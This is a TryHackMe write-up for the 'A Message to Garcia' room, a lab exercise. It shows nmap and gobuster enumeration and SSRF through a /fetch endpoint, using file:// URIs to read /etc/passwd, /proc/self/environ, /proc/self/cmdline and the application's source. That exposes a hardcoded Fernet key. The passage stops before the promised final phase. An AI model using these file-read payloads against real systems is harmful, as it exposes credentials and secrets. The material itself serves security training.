# A Message to Garcia - TryHackMe Writeup

## Basic Information

| Category | Details |
|----------|----------|
| Platform | TryHackMe |
| Room Name | A Message to Garcia |
| Difficulty | Easy |
| Category | Web Exploitation / SSRF / Cryptography |
| Operating System | Linux |

---

# Introduction

Today we are solving another **TryHackMe Easy** challenge named **A Message to Garcia**.

This room combines several important security concepts into a single challenge, including **Server-Side Request Forgery (SSRF)**, **Local File Inclusion through the `file://` protocol**, source code disclosure, and symmetric encryption using **Fernet**. Rather than relying on Remote Code Execution, the challenge focuses on abusing a vulnerable web application to access sensitive files, recover application secrets, and ultimately decrypt the protected message.

The room is inspired by the famous essay **"A Message to Garcia"**, where Lieutenant Rowan successfully delivers an important message by using initiative and resourcefulness rather than waiting for detailed instructions. Likewise, this challenge requires us to gather small pieces of information from different sources and combine them to complete the objective.

---

# Scenario

The challenge begins with the following scenario:

> It was 1899 when "A Message to Garcia" became a powerful metaphor for reliability, initiative, and getting the job done. Much like Lieutenant Rowan, your objective is to deliver a secure message using only the limited information available. Instead of a handwritten letter, the message now resides inside a vulnerable Secure File Transfer (SFTP) application.

Our objectives are:

- Enumerate the exposed services.
- Identify vulnerabilities within the web application.
- Access internal server resources.
- Recover the encryption key.
- Obtain the hidden message.
- Complete the cryptographic challenge.

---

# Objectives

Throughout this assessment we aim to:

- Enumerate exposed services.
- Analyze the web application.
- Discover hidden endpoints.
- Exploit Server-Side Request Forgery (SSRF).
- Read sensitive local files.
- Recover the application source code.
- Obtain the encryption key.
- Recover the final flag.

---

# Attack Methodology

The complete attack path followed during this machine is shown below.

```
Reconnaissance
        │
        ▼
Port Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
Directory Discovery
        │
        ▼
SSRF Discovery
        │
        ▼
Local File Read
        │
        ▼
Application Source Code
        │
        ▼
Encryption Key Recovery
        │
        ▼
Message Validation Logic
        │
        ▼
Flag Recovery
```

---

# Historical Background

Before interacting with the target, the room asks:

> What was the name of the Lieutenant who delivered the message to Garcia?

From the provided story, the answer is:

```
Rowan
```

This serves as an introduction to the room and has no direct impact on exploitation.

---

# Initial Reconnaissance

The target machine IP is:

```
10.49.160.118
```

As always, the first step is identifying all exposed services.

A complete TCP scan is performed.

```bash
nmap -p- 10.49.160.118
```

Results:

```
22/tcp
80/tcp
5000/tcp
```

Three services are exposed:

- SSH
- HTTP
- Flask Web Application

---

# Service Enumeration

A more detailed scan is executed.

```bash
nmap -sC -sV 10.49.160.118
```

The scan reveals:

```
22/tcp

OpenSSH 9.6

80/tcp

Nginx 1.24.0

5000/tcp

Werkzeug
Python Flask
```

One particularly interesting observation is that **port 5000** is running a Flask application through the Werkzeug development server.

---

# Website Enumeration

Opening the web application reveals the following introduction.

```
The goal is to securely deliver a Message to Garcia by:

• Discovering web application vulnerabilities

• Gaining unauthorized access

• Completing the cryptographic challenge
```

At first glance the application appears fairly limited.

No obvious login pages or upload functionality are immediately visible.

This makes further enumeration necessary.

---

# Directory Enumeration

Gobuster is used to enumerate hidden endpoints.

```bash
gobuster dir \
-u http://10.49.160.118 \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

Interesting results include:

```
/backup

/upload

/status

/fetch

/start

/success
```

Among these endpoints, one immediately attracts attention.

```
/fetch
```

Endpoints with names such as **fetch**, **proxy**, **download**, or **preview** frequently indicate Server-Side Request Forgery (SSRF).

---

# Initial SSRF Testing

The application appears capable of retrieving remote resources.

Instead of supplying an HTTP URL, the next step is testing whether it accepts other URI schemes.

Supplying:

```
file:///etc/passwd
```

causes the application to return the contents of the local password file.

This immediately confirms a **Local File Read** vulnerability through the **file://** protocol.

The vulnerability allows arbitrary files on the underlying Linux server to be accessed.

---

# Understanding SSRF

Normally the application should retrieve only external resources.

Expected behavior:

```
User

↓

HTTP URL

↓

Remote Website
```

Actual behavior:

```
User

↓

file://

↓

Local Linux Files
```

Because the server processes the request itself, attackers can access sensitive files that should never be exposed externally.

---

# Reading Environment Variables

One of the most useful files available on Linux systems is:

```
/proc/self/environ
```

Reading:

```
file:///proc/self/environ
```

returns the running application's environment variables.

Several interesting values are exposed.

```
USER=root

HOME=/root

FLASK_ENV=production

VIRTUAL_ENV

PWD=/home/ubuntu/sftp-msg2g4arc1a
```

The most valuable discovery is:

```
PWD=/home/ubuntu/sftp-msg2g4arc1a
```

This reveals the application's installation directory.

---

# Why Environment Variables Matter

Environment variables frequently expose:

- Application paths
- API keys
- Database credentials
- Tokens
- Secrets
- Runtime configuration

Even when credentials are absent, installation paths significantly simplify source code discovery.

---

# Identifying the Application Entry Point

Another useful Linux artifact is:

```
/proc/self/cmdline
```

Reading:

```
file:///proc/self/cmdline
```

reveals:

```
python3 app.py
```

This identifies the Flask application's main entry point.

Knowing both:

```
Application directory

+

Entry point
```

allows direct access to the source code.

---

# Accessing Application Source Code

Using the previously discovered installation directory, the application source becomes accessible.

```
file:///home/ubuntu/sftp-msg2g4arc1a/app.py
```

Reviewing the source helps us understand the application's routing logic.

However, the most valuable file is imported separately.

```
functions.py
```

---

# Recovering Sensitive Source Code

Reading:

```
file:///home/ubuntu/sftp-msg2g4arc1a/functions.py
```

reveals critical application logic.

Several highly sensitive values become immediately visible.

---

## Fernet Encryption Key

The application contains a hardcoded encryption key.

```python
ENCRYPTION_KEY =
b'TUVTU0FHRVRPR0FSQ0lBMjAyNF9LRVkhISEhISEhISE='
```

Hardcoding cryptographic keys inside source code is considered a major security vulnerability.

---

## Expected Secret Message

The application also contains the exact plaintext message used during validation.

```python
EXPECTED_MESSAGE =
"Garcia, it seems I've cracked the code!!

I need you to meet me at coordinates:

40.4168° N, 3.7038° W.

The cipher is:

TRACK"
```

The validation function simply decrypts uploaded content and compares it against this expected string.

---

# Understanding the Validation Logic

The vulnerable application performs the following process.

```
Encrypted File

↓

Decrypt

↓

Plaintext

↓

Compare

↓

Expected Message

↓

Success
```

Because both the encryption key and the expected plaintext are exposed through SSRF, the challenge's cryptographic protection is effectively bypassed.

No cryptanalysis is required.

Instead, the application's own source code reveals every secret needed to generate a valid encrypted message.

---

# Progress So Far

At this stage we have successfully:

- Enumerated all exposed services.
- Identified the Flask web application.
- Discovered hidden endpoints.
- Identified an SSRF vulnerability.
- Confirmed arbitrary local file disclosure.
- Read sensitive Linux system files.
- Retrieved application environment variables.
- Identified the application's installation directory.
- Located the Flask source code.
- Recovered the hardcoded Fernet encryption key.
- Discovered the expected plaintext message used for validation.

The final phase consists of leveraging these discoveries to complete the cryptographic challenge, retrieve the success page, obtain the final flag, analyze the application's security weaknesses, map the attack to the MITRE ATT&CK framework, and conclude the assessment. :contentReference[oaicite:0]{index=0}
